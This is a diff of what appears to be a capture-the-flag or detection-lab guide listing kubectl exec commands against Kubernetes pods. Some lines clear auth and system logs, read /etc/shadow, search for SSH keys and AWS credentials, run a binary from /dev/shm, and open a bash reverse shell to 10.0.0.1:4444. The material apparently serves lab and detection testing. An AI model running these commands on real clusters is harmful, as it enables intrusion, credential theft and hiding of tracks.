@@ -213,11 +213,6 @@ kubectl apply -f deployment7.yaml
 ```
 kubectl exec -it -n flag7 $(kubectl get pods -n flag7 --selector=app=ctf-app -o name) -- sh -c "cat /dev/null > /var/log/auth.log"
 kubectl exec -it -n flag7 $(kubectl get pods -n flag7 --selector=app=ctf-app -o name) -- cat /etc/shadow
-kubectl exec -it -n google $(kubectl get pods -n google --selector=app=frontend -o name) -- sh -c "cat /dev/null > /var/log/syslog"
-kubectl exec -it -n google $(kubectl get pods -n google --selector=app=checkoutservice -o name) -- sh -c "cp /bin/ls /dev/shm/malicious_exec; /dev/shm/malicious_exec"
-kubectl exec -it -n flag7 $(kubectl get pods -n flag7 --selector=app=ctf-app -o name) -- find / -name id_rsa
-kubectl exec -it -n google $(kubectl get pods -n google --selector=app=productcatalogservice -o name) -- find / -name .aws/credentials
 kubectl exec -it -n flag7 $(kubectl get pods -n flag7 --selector=app=ctf-app -o name) -- bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
-kubectl exec -it -n google $(kubectl get pods -n google --selector=app=cartservice -o name) -- curl -k https://kubernetes.default.svc.cluster.local/version
 kubectl exec -it -n flag7 $(kubectl get pods -n flag7 --selector=app=ctf-app -o name) -- /bin/bash
 ```
